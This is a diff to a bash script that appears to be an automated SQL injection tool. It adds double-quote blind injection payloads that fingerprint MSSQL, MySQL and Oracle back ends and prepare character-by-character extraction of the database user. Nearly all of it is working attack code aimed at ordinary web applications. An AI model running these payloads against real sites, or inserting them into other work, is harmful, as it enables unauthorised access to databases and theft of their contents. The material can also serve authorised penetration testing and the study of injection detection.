@@ -410,6 +410,8 @@ oracledb=0
 firstchar="${payload:1:1}"
 if [[ "$firstchar" == "'" ]] ; then	
 	quote="'"
+elif [[ "$firstchar" == '"' ]] ; then
+	quote='"'
 else
 	quote=""
 fi
@@ -921,6 +923,43 @@ if [[ "$status_true" == "$status_false" ]] ; then
 	fi
 fi
 
+#mssqlcheck DOUBLE QUOTE- only works on string params
+badparams=`echo "$cleanoutput" | replace "$payload" "a\" or 789=789/(case when (ascii(substring((select system_user),1,1)) > 0) then 1 else 0 end)$end"`
+encodeinput=$badparams
+encodeme
+badparams=$encodeoutput
+requester
+#echo "debug true $request"
+status_true=`echo $response | cut -d ":" -f 1`
+length_true=`echo $response | cut -d ":" -f 2`
+badparams=`echo "$cleanoutput" | replace "$payload" "a\" or 789=789/(case when (ascii(substring((select system_user),1,1)) > 255) then 1 else 0 end)$end"`
+encodeinput=$badparams
+encodeme
+badparams=$encodeoutput
+requester
+#echo "debug false $request"
+status_false=`echo $response | cut -d ":" -f 1`
+length_false=`echo $response | cut -d ":" -f 2`
+((lendiff=$length_true-$length_false))
+if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
+	#echo -e '\E[31;48m'"\033[1m[STATUS DIFF T:$status_true F:$status_false DB is MSSQL REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
+	remessage="STATUS DIFF T:$status_true F:$status_false DB is MSSQL"
+	echoreporter
+	dbms="mssql"
+	numerator="a\" or 789=789"
+	#lettergrab
+fi
+if [[ "$status_true" == "$status_false" ]] ; then
+	if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then
+		#echo -e '\E[31;48m'"\033[1m[LENGTH DIFF EQUALS $lendiff DB is MSSQL REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
+		remessage="LENGTH DIFF EQUALS $lendiff DB is MSSQL"
+		echoreporter
+		dbms="mssql"
+		numerator="a\" or 789=789"
+ 		#lettergrab
+	fi
+fi
+
 #mysqlcheck - only works on numeric params
 badparams=`echo "$cleanoutput" | replace "$payload" "1/case when ascii(substr(system_user(),1,1)) > 0 then 1 else 0 end$end"`
 encodeinput=$badparams
@@ -995,6 +1034,41 @@ if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
 	fi
 fi
 
+#mysqlcheck DOUBLE QUOTE- only works on string params
+badparams=`echo "$cleanoutput" | replace "$payload" "a\" or 789=789/case when ascii(substr(system_user(),1,1)) > 0 then 1 else 0 end$end"`
+encodeinput=$badparams
+encodeme
+badparams=$encodeoutput
+requester
+status_true=`echo $response | cut -d ":" -f 1`
+length_true=`echo $response | cut -d ":" -f 2`
+badparams=`echo "$cleanoutput" | replace "$payload" "a\" or 789=789/case when ascii(substr(system_user(),1,1)) > 255 then 1 else 0 end$end"`
+encodeinput=$badparams
+encodeme
+badparams=$encodeoutput
+requester
+status_false=`echo $response | cut -d ":" -f 1`
+length_false=`echo $response | cut -d ":" -f 2`
+((lendiff=$length_true-$length_false))
+if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
+	#echo -e '\E[31;48m'"\033[1m[STATUS DIFF T:$status_true F:$status_false DB is MYSQL REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
+	remessage="STATUS DIFF T:$status_true F:$status_false DB is MYSQL"
+	echoreporter
+	numerator="1\" or 789"
+	dbms="mysql"
+ 	#lettergrab
+fi
+if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
+	if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then			
+		#echo -e '\E[31;48m'"\033[1m[LENGTH DIFF EQUALS $lendiff DB is MYSQL REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
+		#tput sgr0 # Reset attributes.
+		remessage="LENGTH DIFF EQUALS $lendiff DB is MYSQL"
+		echoreporter
+		dbms="mysql"
+		numerator="1\" or 789"
+ 		#lettergrab
+	fi
+fi
 
 #oraclecheck - only works on numeric params
 badparams=`echo "$cleanoutput" | replace "$payload" "1 or 1=(case when (ascii(substr((select user from dual),1,1)) > 0) then 1 else 0 end)$end"`
@@ -1067,6 +1141,43 @@ if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
 		#lettergrab
 	fi
 fi
+
+#oraclecheck DOUBLE QUOTE - only works on string params
+badparams=`echo "$cleanoutput" | replace "$payload" "a\" or 789/(case when (ascii(substr((select user from dual),1,1)) > 0) then 789 else 0 end)$end"`
+encodeinput=$badparams
+encodeme
+badparams=$encodeoutput
+requester
+status_true=`echo $response | cut -d ":" -f 1`
+length_true=`echo $response | cut -d ":" -f 2`
+badparams=`echo "$cleanoutput" | replace "$payload" "a\" or 789/(case when (ascii(substr((select user from dual),1,1)) > 255) then 789 else 0 end)$end"`
+encodeinput=$badparams
+encodeme
+badparams=$encodeoutput
+requester
+status_false=`echo $response | cut -d ":" -f 1`
+length_false=`echo $response | cut -d ":" -f 2`
+((lendiff=$length_true-$length_false))
+if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
+	#echo -e '\E[31;48m'"\033[1m[STATUS DIFF T:$status_true F:$status_false DB is ORACLE REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams" 
+	dbms="oracle"
+	remessage="STATUS DIFF T:$status_true F:$status_false DB is ORACLE"
+	numerator="1\" or 789"
+	echoreporter
+	#lettergrab
+fi
+if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
+	if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then			
+		#echo -e '\E[31;48m'"\033[1m[LENGTH DIFF EQUALS $lendiff DB is ORACLE REQ:$K]\033[0m $method URL: $uhostname$page"?"$badparams"
+		#tput sgr0 # Reset attributes.
+		dbms="oracle"
+		remessage="LENGTH DIFF EQUALS $lendiff DB is ORACLE"
+		numerator="1\" or 789"
+		echoreporter
+		#lettergrab
+	fi
+fi
+
 #end of dbms enumeraton if statement
 
 #i had a problem when doing fully blind delay based exploitation: i know the dbms (from the delay payload), but i dont know the numerator [effectively whether injection requires a quote or not]. so, the code below checks to see if we have a value for numerator, if not, we set it to 1. we also set the guessednumeratorflag=1 which causes a second run with a numerator of 1'
